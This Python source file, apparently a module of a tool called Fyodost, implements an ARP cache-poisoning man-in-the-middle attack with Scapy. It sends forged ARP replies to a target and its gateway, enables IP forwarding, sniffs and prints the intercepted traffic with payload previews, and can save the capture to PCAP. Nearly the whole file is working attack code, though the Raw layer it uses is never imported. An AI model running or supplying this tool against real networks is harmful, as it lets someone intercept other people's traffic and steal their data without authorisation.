from scapy.all import ARP, Ether, IP, TCP, UDP, ICMP, send, sniff, srp, get_if_hwaddr, get_if_addr
from scapy.all import PcapWriter
import argparse
import time
import threading
import os
import signal
import sys

attack_active = False
pcap_writer = None

def execute(args):
    """Execute ARP cache poisoning attack with PCAP capture"""
    global attack_active, pcap_writer
    
    if not args.target_ip or not args.gateway_ip:
        print("[-] Both target IP and gateway IP are required for ARP poisoning")
        return False
    
    print(f"[ARP Poisoning] Starting MITM attack between {args.target_ip} and {args.gateway_ip}")
    
    if args.pcap:
        pcap_path = args.pcap if args.pcap != "default" else os.path.expanduser("~/Fyodost/arp_poisoning.pcap")
        os.makedirs(os.path.dirname(pcap_path), exist_ok=True)
        pcap_writer = PcapWriter(pcap_path, append=True, sync=True)
        print(f"[ARP Poisoning] PCAP capture enabled: {pcap_path}")
    
    try:
        target_mac = get_mac(args.target_ip, args.interface)
        gateway_mac = get_mac(args.gateway_ip, args.interface)
        
        if not target_mac or not gateway_mac:
            print("[-] Could not resolve MAC addresses")
            return False
        
        print(f"[ARP Poisoning] Target MAC: {target_mac}")
        print(f"[ARP Poisoning] Gateway MAC: {gateway_mac}")
        
        enable_ip_forwarding()
        attack_active = True
        
        poison_thread = threading.Thread(
            target=arp_poison, 
            args=(args.target_ip, target_mac, args.gateway_ip, gateway_mac, args.interface)
        )
        poison_thread.daemon = True
        poison_thread.start()
        
        sniff_thread = threading.Thread(
            target=sniff_traffic,
            args=(args.interface, args.target_ip, args.gateway_ip, pcap_writer)
        )
        sniff_thread.daemon = True
        sniff_thread.start()
        signal.signal(signal.SIGINT, signal_handler)
        
        duration = args.duration if args.duration else 30
        print(f"[ARP Poisoning] Attack running for {duration} seconds. Press Ctrl+C to stop early.")
        
        time.sleep(duration)
        
        attack_active = False
        restore_arp(args.target_ip, target_mac, args.gateway_ip, gateway_mac, args.interface)
        disable_ip_forwarding()
        
        if pcap_writer:
            pcap_writer.close()
            print(f"[ARP Poisoning] PCAP file saved: {pcap_writer.filename}")
        
        print("[ARP Poisoning] Attack completed successfully")
        return True
        
    except Exception as e:
        print(f"[ARP Poisoning] Error: {e}")
        attack_active = False
        if pcap_writer:
            pcap_writer.close()
        return False

def get_mac(ip, interface):
    """Get MAC address for an IP using ARP request"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    try:
        answered = srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        return answered[0][1].hwsrc if answered else None
    except:
        return None

def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Continuously send ARP poison packets"""
    print("[ARP Poisoning] Starting ARP poison loop")
    
    poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    packet_count = 0
    
    while attack_active:
        try:
            send(poison_target, verbose=False, iface=interface)
            send(poison_gateway, verbose=False, iface=interface)
            packet_count += 2
            
            if packet_count % 10 == 0:  
                print(f"[ARP Poisoning] Sent {packet_count} poison packets")
                
            time.sleep(2) 
            
        except Exception as e:
            print(f"[ARP Poisoning] Error in poison loop: {e}")
            break
    
    print("[ARP Poisoning] Stopped ARP poison loop")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Restore ARP tables to correct values"""
    print("[ARP Poisoning] Restoring ARP tables")
    
    restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    restore_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    
    for _ in range(5): 
        send(restore_target, verbose=False, iface=interface)
        send(restore_gateway, verbose=False, iface=interface)
        time.sleep(1)
    
    print("[ARP Poisoning] ARP tables restored")

def enable_ip_forwarding():
    """Enable IP forwarding on the system"""
    import os
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP Poisoning] Enabled IP forwarding")

def disable_ip_forwarding():
    """Disable IP forwarding on the system"""
    import os
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP Poisoning] Disabled IP forwarding")

def sniff_traffic(interface, target_ip, gateway_ip, pcap_writer=None):
    """Sniff and display intercepted traffic with PCAP capture"""
    print(f"[ARP Poisoning] Sniffing traffic between {target_ip} and {gateway_ip}")
    
    intercepted_count = 0
    
    def packet_callback(packet):
        nonlocal intercepted_count
        
        if not attack_active:
            return False
            
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            if (src_ip == target_ip and dst_ip == gateway_ip) or \
               (src_ip == gateway_ip and dst_ip == target_ip):
                intercepted_count += 1
                
                if packet.haslayer(TCP):
                    protocol = "TCP"
                    sport = packet[TCP].sport
                    dport = packet[TCP].dport
                    info = f"{sport} -> {dport}"
                elif packet.haslayer(UDP):
                    protocol = "UDP"
                    sport = packet[UDP].sport
                    dport = packet[UDP].dport
                    info = f"{sport} -> {dport}"
                elif packet.haslayer(ICMP):
                    protocol = "ICMP"
                    info = f"type {packet[ICMP].type}"
                else:
                    protocol = "Other"
                    info = ""
                
                print(f"[INTERCEPTED #{intercepted_count}] {src_ip} -> {dst_ip} ({protocol}) {info}")
                
                if pcap_writer:
                    pcap_writer.write(packet)
                
                if intercepted_count <= 5:
                    print(f"    Packet length: {len(packet)} bytes")
                    if packet.haslayer(Raw):
                        payload_preview = bytes(packet[Raw])[:50]
                        print(f"    Payload preview: {payload_preview}")
    
    try:
        filter_str = f"host {target_ip} and host {gateway_ip}"
        sniff(iface=interface, filter=filter_str, prn=packet_callback, 
              stop_filter=lambda x: not attack_active, store=0)
              
    except Exception as e:
        print(f"[ARP Poisoning] Sniffing error: {e}")
    
    print(f"[ARP Poisoning] Stopped sniffing. Total packets intercepted: {intercepted_count}")

def signal_handler(sig, frame):
    """Handle interrupt signals for graceful shutdown"""
    global attack_active, pcap_writer
    
    print("\n[ARP Poisoning] Interrupt received, stopping attack...")
    attack_active = False
    
    if pcap_writer:
        pcap_writer.close()
        print(f"[ARP Poisoning] PCAP file saved: {pcap_writer.filename}")
    
    sys.exit(0)

def add_arguments(parser):
    """Add ARP poisoning specific arguments to parser"""
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--gateway-ip", "-gi", required=True, help="Gateway IP address")
    parser.add_argument("--duration", "-d", type=int, default=30, 
                       help="Attack duration in seconds (default: 30)")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default: ~/Fyodost/arp_poisoning.pcap")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Cache Poisoning Attack with PCAP Capture")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--target-ip", "-ti", required=True, help="Target IP address")
    parser.add_argument("--gateway-ip", "-gi", required=True, help="Gateway IP address")
    parser.add_argument("--duration", "-d", type=int, default=30, 
                       help="Attack duration in seconds")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        sys.exit(1)
    
    execute(args)